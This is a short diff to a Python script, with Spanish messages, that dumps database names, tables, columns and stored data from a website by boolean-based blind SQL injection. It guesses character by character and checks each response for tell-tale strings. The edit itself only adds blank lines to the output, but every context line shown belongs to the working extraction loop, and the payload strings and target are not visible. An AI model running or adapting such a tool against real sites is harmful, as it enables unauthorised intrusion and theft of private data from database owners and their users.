@@ -113,7 +113,9 @@ def obtenerBD2():
             if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                 nombreBD+=c
                 letra+=1
+                print("")
                 print("[INFO] Se encontro un caracter: "+nombreBD)
+                print("")
                 break
 
     print("[INFO] BASES DE DATOS: "+str(bds))
@@ -167,7 +169,9 @@ def obtenerTablas(database):
                 print('[PAYLOAD] ' + blindSql)
                 if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                     nombreTabla+=c
+                    print("")
                     print("[INFO] Se encontro:"+nombreTabla)
+                    print("")
                     break
 
         # print(nombreTabla)
@@ -225,7 +229,9 @@ def obtenerColumnas(tabla,database):
                 print('[PAYLOAD] '+blindSql)
                 if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                     nombreColumna+=c
+                    print("")
                     print("[INFO] Se encontro: "+nombreColumna)
+                    print("")
                     break
 
         print("[INFO] Se encontro una columna: "+nombreColumna)
@@ -259,7 +265,9 @@ def obtenerDatos(tabla,database):
                     print('[PAYLOAD] '+blindSql)
                     if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)):
                         nombreDato+=c
+                        print("")
                         print("[INFO] Se encontro: "+nombreDato)
+                        print("")
                         break
                     r = requests.get(sitio + breik)
                     if (re.search('preloader : true,', r.text) or re.search('responsive : true,', r.text)): #si ya termino el string del dato, rompe el bucle
